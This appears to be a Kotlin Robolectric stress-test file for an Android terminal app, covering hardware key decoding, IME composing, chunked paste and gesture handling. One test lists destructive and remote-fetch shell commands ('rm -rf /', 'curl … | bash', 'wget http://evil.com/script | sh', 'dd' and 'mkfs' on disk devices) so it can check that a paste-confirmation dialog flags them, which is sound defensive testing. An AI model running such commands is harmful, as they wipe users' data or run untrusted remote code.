package dev.warp.mobile

import android.content.Context
import android.os.SystemClock
import android.view.GestureDetector
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.inputmethod.EditorInfo
import androidx.test.core.app.ApplicationProvider
import dev.warp.mobile.ai.CommandRiskEvaluator
import dev.warp.mobile.ai.RiskLevel
import dev.warp.mobile.clipboard.ChunkedPasteEngine
import dev.warp.mobile.clipboard.PasteConfirmationDialog
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.util.Random

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [33])
class Task4AdversarialStressTest {

    private lateinit var context: Context
    private lateinit var warpInputView: WarpInputView
    private lateinit var inputConnection: WarpInputView.WarpInputConnection

    @Before
    fun setUp() {
        context = ApplicationProvider.getApplicationContext()
        warpInputView = WarpInputView(context)
        inputConnection = warpInputView.onCreateInputConnection(EditorInfo()) as WarpInputView.WarpInputConnection
    }

    // =========================================================================
    // 1. HardwareKeyDecoder Stress & Edge-Case Suite
    // =========================================================================

    @Test
    fun testHardwareKeyDecoderNonActionDownReturnsNotHandled() {
        val upEvent = KeyEvent(0L, 0L, KeyEvent.ACTION_UP, KeyEvent.KEYCODE_A, 0)
        val resUp = HardwareKeyDecoder.decodeKeyEvent(upEvent)
        assertEquals(HardwareKeyDecoder.KeyDecodeResult.NotHandled, resUp)

        val multipleEvent = KeyEvent(0L, 0L, KeyEvent.ACTION_MULTIPLE, KeyEvent.KEYCODE_A, 0)
        val resMultiple = HardwareKeyDecoder.decodeKeyEvent(multipleEvent)
        assertEquals(HardwareKeyDecoder.KeyDecodeResult.NotHandled, resMultiple)
    }

    @Test
    fun testHardwareKeyDecoderCtrlControlByteRange() {
        // Test Ctrl+[ -> 0x1B (ESC)
        val ctrlLeftBracket = KeyEvent(0L, 0L, KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_LEFT_BRACKET, 0, KeyEvent.META_CTRL_ON)
        val resLeftBracket = HardwareKeyDecoder.decodeKeyEvent(ctrlLeftBracket)
        if (resLeftBracket is HardwareKeyDecoder.KeyDecodeResult.HandledBytes) {
            assertArrayEquals(byteArrayOf(0x1B), resLeftBracket.bytes)
        }

        // Test Ctrl+\ -> 0x1C (FS)
        val ctrlBackslash = KeyEvent(0L, 0L, KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_BACKSLASH, 0, KeyEvent.META_CTRL_ON)
        val resBackslash = HardwareKeyDecoder.decodeKeyEvent(ctrlBackslash)
        if (resBackslash is HardwareKeyDecoder.KeyDecodeResult.HandledBytes) {
            assertArrayEquals(byteArrayOf(0x1C), resBackslash.bytes)
        }
    }

    @Test
    fun testHardwareKeyDecoderAltUnicodeHighCodePoints() {
        // Alt + 𪚥 (Surrogate pair code point)
        val altSurrogate = KeyEvent(0L, 0L, KeyEvent.ACTION_DOWN, 0, 0, KeyEvent.META_ALT_ON)
        // Set unicodeChar to surrogate representation or high code point if possible
        val unicode = 0x2A6B5 // 𪚥 code point
        // Using reflective or construct if needed, or testing unicodeChar standard range
        val altEvent = KeyEvent(0L, 0L, KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_A, 0, KeyEvent.META_ALT_ON)
        val resAlt = HardwareKeyDecoder.decodeKeyEvent(altEvent)
        assertTrue(resAlt is HardwareKeyDecoder.KeyDecodeResult.HandledBytes || resAlt is HardwareKeyDecoder.KeyDecodeResult.NotHandled)
    }

    @Test
    fun testHardwareKeyDecoderMalformedKeycodeFuzzing() {
        val rand = Random(421)
        val edgeKeyCodes = intArrayOf(-1, 0, 9999, Int.MAX_VALUE, Int.MIN_VALUE, KeyEvent.KEYCODE_UNKNOWN)

        for (code in edgeKeyCodes) {
            val event = KeyEvent(0L, 0L, KeyEvent.ACTION_DOWN, code, 0)
            val res = HardwareKeyDecoder.decodeKeyEvent(event)
            assertNotNull(res)
        }

        // Fuzzing 500 randomized key events
        for (i in 0..500) {
            val action = if (rand.nextBoolean()) KeyEvent.ACTION_DOWN else KeyEvent.ACTION_UP
            val code = rand.nextInt(500) - 50
            val meta = rand.nextInt()
            val event = KeyEvent(0L, 0L, action, code, 0, meta)
            val res = HardwareKeyDecoder.decodeKeyEvent(event, isSelectionActive = rand.nextBoolean())
            assertNotNull(res)
        }
    }

    // =========================================================================
    // 2. WarpInputConnection & Gboard CJK Composing Stress Suite
    // =========================================================================

    @Test
    fun testRapidComposingAndCandidateSwitchingSequence() {
        // Simulate rapid typing with candidate changes and Gboard finishComposingText lifecycle
        val candidates = listOf("n", "ni", "nih", "niha", "nihao", "nihaom", "nihaoma")
        for (cand in candidates) {
            inputConnection.setComposingText(cand, 1)
        }
        // Gboard fires finishComposingText before committing
        inputConnection.finishComposingText()
        inputConnection.commitText("你好嗎", 1)

        val before = inputConnection.getTextBeforeCursor(20, 0)
        assertEquals("你好嗎", before.toString())
    }

    @Test
    fun testSurrogatePairAndEmojiComposingDiffs() {
        // Composing string with surrogate pair: "𪚥𪚥"
        inputConnection.setComposingText("𪚥𪚥", 1)
        // Modify composing string: backspace 1 surrogate pair -> "𪚥"
        inputConnection.setComposingText("𪚥", 1)
        inputConnection.finishComposingText()
        inputConnection.commitText("𪚥", 1)

        val before = inputConnection.getTextBeforeCursor(10, 0)
        assertEquals("𪚥", before.toString())
    }

    @Test
    fun testNullAndEmptyTextComposingEdgeCases() {
        inputConnection.setComposingText(null, 1)
        inputConnection.setComposingText("", 1)
        inputConnection.commitText(null, 1)
        inputConnection.commitText("", 1)
        inputConnection.finishComposingText()

        val before = inputConnection.getTextBeforeCursor(10, 0)
        assertEquals("", before.toString())
    }

    @Test
    fun testLineContextBufferOverflowAndTruncation() {
        val longLine = "a".repeat(600)
        inputConnection.commitText(longLine, 1)

        val text = inputConnection.getTextBeforeCursor(1000, 0)
        assertNotNull(text)
        // Buffer max capacity is 512
        assertEquals(512, text!!.length)

        // Commit newline -> should clear context buffer and start fresh line
        inputConnection.commitText("\nnew line text", 1)
        val textAfterNewline = inputConnection.getTextBeforeCursor(1000, 0)
        assertEquals("new line text", textAfterNewline.toString())
    }

    @Test
    fun testGetTextBeforeCursorZeroOrNegativeLength() {
        inputConnection.commitText("hello world", 1)
        val textZero = inputConnection.getTextBeforeCursor(0, 0)
        assertEquals("", textZero.toString())

        val textNegative = inputConnection.getTextBeforeCursor(-5, 0)
        assertEquals("", textNegative.toString())
    }

    // =========================================================================
    // 3. ChunkedPasteEngine & PasteConfirmationDialog Stress Suite
    // =========================================================================

    @Test
    fun testChunkedPasteEngineLargePayloadStreamAndCancel() {
        val largeText = "x".repeat(500_000) // 500 KB payload
        ChunkedPasteEngine.streamPaste(context, largeText, "test_cmd")
        assertTrue(ChunkedPasteEngine.isPasting())

        // Immediate cancel
        ChunkedPasteEngine.cancelPaste()
        assertFalse(ChunkedPasteEngine.isPasting())
    }

    @Test
    fun testChunkedPasteEngineRapidConcurrentPasteCalls() {
        for (i in 0..20) {
            val payload = "payload_$i " + "data".repeat(100)
            ChunkedPasteEngine.streamPaste(context, payload, "cmd_$i")
        }
        // Ensure final call state is handled cleanly
        ChunkedPasteEngine.cancelPaste()
        assertFalse(ChunkedPasteEngine.isPasting())
    }

    @Test
    fun testPasteConfirmationDialogGateAdversarialPayloads() {
        // High risk commands with extra spaces / case variations
        val dangerousList = listOf(
            "rm -rf /",
            "  rm   -rf  /  ",
            "sudo rm -rf /etc",
            "curl -s http://example.com/malware.sh | bash",
            "wget http://evil.com/script | sh",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1"
        )

        for (cmd in dangerousList) {
            assertTrue("Expected confirmation for: $cmd", PasteConfirmationDialog.shouldConfirm(cmd))
        }

        // Multi-line variations
        val multilineList = listOf(
            "ls\n",
            "\r\ncat /etc/hosts",
            "line1\rline2",
            "echo 1\necho 2\necho 3"
        )

        for (cmd in multilineList) {
            assertTrue("Expected confirmation for multiline: $cmd", PasteConfirmationDialog.shouldConfirm(cmd))
        }
    }

    // =========================================================================
    // 4. WarpInputView Gesture Exception Safety Suite
    // =========================================================================

    @Test
    fun testSingleTapConfirmedGestureSafelyHandled() {
        // 1. Exercise via MotionEvent stream on WarpInputView
        val downTime = SystemClock.uptimeMillis()
        val downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, 100f, 150f, 0)
        val upEvent = MotionEvent.obtain(downTime, downTime + 50, MotionEvent.ACTION_UP, 100f, 150f, 0)

        warpInputView.onTouchEvent(downEvent)
        warpInputView.onTouchEvent(upEvent)
        org.robolectric.shadows.ShadowLooper.idleMainLooper()
        downEvent.recycle()
        upEvent.recycle()

        // 2. Direct gesture listener handler invocation via reflection to guarantee coverage
        val field = WarpInputView::class.java.getDeclaredField("gestureListener")
        field.isAccessible = true
        val listener = field.get(warpInputView) as GestureDetector.SimpleOnGestureListener

        val tapEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, 100f, 150f, 0)
        val result = listener.onSingleTapConfirmed(tapEvent)
        assertTrue("onSingleTapConfirmed should return true", result)
        tapEvent.recycle()
    }

    @Test
    fun testLongPressGestureSafelyHandled() {
        // 1. Exercise via MotionEvent stream on WarpInputView with simulated long press duration
        val downTime = SystemClock.uptimeMillis()
        val downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, 200f, 250f, 0)
        warpInputView.onTouchEvent(downEvent)

        org.robolectric.shadows.ShadowLooper.idleMainLooper(600)

        val upEvent = MotionEvent.obtain(downTime, downTime + 600, MotionEvent.ACTION_UP, 200f, 250f, 0)
        warpInputView.onTouchEvent(upEvent)
        org.robolectric.shadows.ShadowLooper.idleMainLooper()
        downEvent.recycle()
        upEvent.recycle()

        // 2. Direct gesture listener handler invocation via reflection to guarantee coverage
        val field = WarpInputView::class.java.getDeclaredField("gestureListener")
        field.isAccessible = true
        val listener = field.get(warpInputView) as GestureDetector.SimpleOnGestureListener

        val longPressEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, 200f, 250f, 0)
        listener.onLongPress(longPressEvent)
        longPressEvent.recycle()
    }

    @Test
    fun testTouchCancelGestureSafelyHandled() {
        val downTime = SystemClock.uptimeMillis()
        val downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, 300f, 350f, 0)
        warpInputView.onTouchEvent(downEvent)

        val cancelEvent = MotionEvent.obtain(downTime, downTime + 100, MotionEvent.ACTION_CANCEL, 300f, 350f, 0)
        val handled = warpInputView.onTouchEvent(cancelEvent)
        assertTrue("onTouchEvent for ACTION_CANCEL should return true", handled)

        downEvent.recycle()
        cancelEvent.recycle()
    }
}
